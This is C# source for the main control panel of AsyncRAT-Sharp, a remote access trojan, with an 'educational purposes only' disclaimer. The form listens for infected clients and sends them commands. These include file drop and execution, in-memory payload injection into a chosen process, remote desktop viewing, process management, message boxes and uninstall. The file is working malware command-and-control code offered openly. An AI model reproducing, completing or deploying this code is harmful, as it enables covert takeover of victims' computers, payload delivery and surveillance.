using System;
using System.Windows.Forms;
using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System.Threading.Tasks;
using Microsoft.VisualBasic;
using System.Linq;
using System.Threading;
using System.Drawing;
using System.IO;
using AsyncRAT_Sharp.Forms;

//       │ Author     : NYAN CAT
//       │ Name       : AsyncRAT // Simple Socket

//       Contact Me   : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.

namespace AsyncRAT_Sharp
{

    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("AsyncRAT-Sharp {0} // NYAN CAT", Settings.Version);

            Listener listener = new Listener();
            Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
            thread.Start(Settings.Port);
        }


        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Environment.Exit(0);
        }


        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                if (listView1.Items.Count > 0)
                {
                    foreach (ListViewItem x in listView1.Items)
                        x.Selected = true;
                }
            }
        }


        private void listView1_MouseMove(object sender, MouseEventArgs e)
        {
            ListViewHitTestInfo hitInfo = listView1.HitTest(e.Location);
            if (e.Button == MouseButtons.Left && (hitInfo.Item != null || hitInfo.SubItem != null))
            {
                listView1.Items[hitInfo.Item.Index].Selected = true;
            }
        }


        private async void ping_Tick(object sender, EventArgs e)
        {
            if (Settings.Online.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                foreach (Clients CL in Settings.Online.ToList())
                {
                    await Task.Run(() =>
                    {
                        CL.BeginSend(msgpack.Encode2Bytes());
                    });
                }
            }
        }


        private void UpdateUI_Tick(object sender, EventArgs e)
        {
            toolStripStatusLabel1.Text = string.Format("Online {0}     Sent {1}     Received {2}", Settings.Online.Count.ToString(), Helper.BytesToString(Settings.Sent).ToString(), Helper.BytesToString(Settings.Received).ToString());
        }

        private async void cLOSEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "close";
                foreach (ListViewItem C in listView1.SelectedItems)
                {
                    await Task.Run(() =>
                    {
                        Clients CL = (Clients)C.Tag;
                        CL.BeginSend(msgpack.Encode2Bytes());
                    });
                }
            }
        }

        private async void sENDMESSAGEBOXToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                string Msgbox = Interaction.InputBox("Message", "Message", "Hello World!");
                if (string.IsNullOrEmpty(Msgbox))
                    return;
                else
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "sendMessage";
                    msgpack.ForcePathObject("Message").AsString = Msgbox;
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        await Task.Run(() =>
                        {
                            Clients CL = (Clients)C.Tag;
                            CL.BeginSend(msgpack.Encode2Bytes());
                        });
                    }
                }
            }
        }

        private async void sENDFILEToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    OpenFileDialog O = new OpenFileDialog();
                    if (O.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "sendFile";
                        await msgpack.ForcePathObject("File").LoadFileAsBytes(O.FileName);
                        msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(O.FileName);
                        msgpack.ForcePathObject("Update").AsString = "false";
                        foreach (ListViewItem C in listView1.SelectedItems)
                        {
                            await Task.Run(() =>
                            {
                                Clients CL = (Clients)C.Tag;
                                CL.BeginSend(msgpack.Encode2Bytes());
                                CL.LV.ForeColor = Color.Red;
                            });
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private async void uNISTALLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "uninstall";
                foreach (ListViewItem C in listView1.SelectedItems)
                {
                    await Task.Run(() =>
                    {
                        Clients CL = (Clients)C.Tag;
                        CL.BeginSend(msgpack.Encode2Bytes());
                    });
                }
            }
        }

        private async void uPDATEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    OpenFileDialog O = new OpenFileDialog();
                    if (O.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "sendFile";
                        await msgpack.ForcePathObject("File").LoadFileAsBytes(O.FileName);
                        msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(O.FileName);
                        msgpack.ForcePathObject("Update").AsString = "true";
                        foreach (ListViewItem C in listView1.SelectedItems)
                        {
                            await Task.Run(() =>
                            {
                                Clients CL = (Clients)C.Tag;
                                CL.BeginSend(msgpack.Encode2Bytes());
                                CL.LV.ForeColor = Color.Red;
                            });
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private async void sENDFILETOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                SendFileToMemory SF = new SendFileToMemory();
                SF.ShowDialog();
                if (SF.toolStripStatusLabel1.Text.Length > 0 && SF.toolStripStatusLabel1.ForeColor == Color.Green)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "sendMemory";
                    msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(SF.toolStripStatusLabel1.Tag.ToString()));
                    if (SF.comboBox1.SelectedIndex == 0)
                    {
                        msgpack.ForcePathObject("Inject").AsString = "";
                        msgpack.ForcePathObject("Plugin").SetAsBytes(new byte[1]);
                    }
                    else
                    {
                        msgpack.ForcePathObject("Inject").AsString = SF.comboBox2.Text;
                        msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.Plugin);
                    }

                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        await Task.Run(() =>
                        {
                            Clients CL = (Clients)C.Tag;
                            CL.BeginSend(msgpack.Encode2Bytes());
                            CL.LV.ForeColor = Color.Red;
                        });
                    }
                }
                SF.Close();
            }
        }

        private async void rEMOTEDESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                    msgpack.ForcePathObject("Option").AsString = "true";
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        await Task.Run(() =>
                        {
                            Clients CL = (Clients)C.Tag;
                            this.BeginInvoke((MethodInvoker)(() =>
                            {
                                RemoteDesktop RD = (RemoteDesktop)Application.OpenForms["RemoteDesktop:" + CL.ID];
                                if (RD == null)
                                {
                                    RD = new RemoteDesktop
                                    {
                                        Name = "RemoteDesktop:" + CL.ID,
                                        F = this,
                                        Text = "RemoteDesktop:" + CL.ID,
                                        C = CL,
                                        Active = true
                                    };
                                    RD.Show();
                                    CL.BeginSend(msgpack.Encode2Bytes());
                                }
                            }));
                        });
                    }
                }
            }
        }

        private async void pROCESSMANAGERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "processManager";
                    msgpack.ForcePathObject("Option").AsString = "List";
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        await Task.Run(() =>
                        {
                            Clients CL = (Clients)C.Tag;
                            this.BeginInvoke((MethodInvoker)(() =>
                            {
                                ProcessManager PM = (ProcessManager)Application.OpenForms["processManager:" + CL.ID];
                                if (PM == null)
                                {
                                    PM = new ProcessManager
                                    {
                                        Name = "processManager:" + CL.ID,
                                        Text = "processManager:" + CL.ID,
                                        F = this,
                                        C = CL
                                    };
                                    PM.Show();
                                    CL.BeginSend(msgpack.Encode2Bytes());
                                }
                            }));
                        });
                    }
                }
            }
        }
    }
}
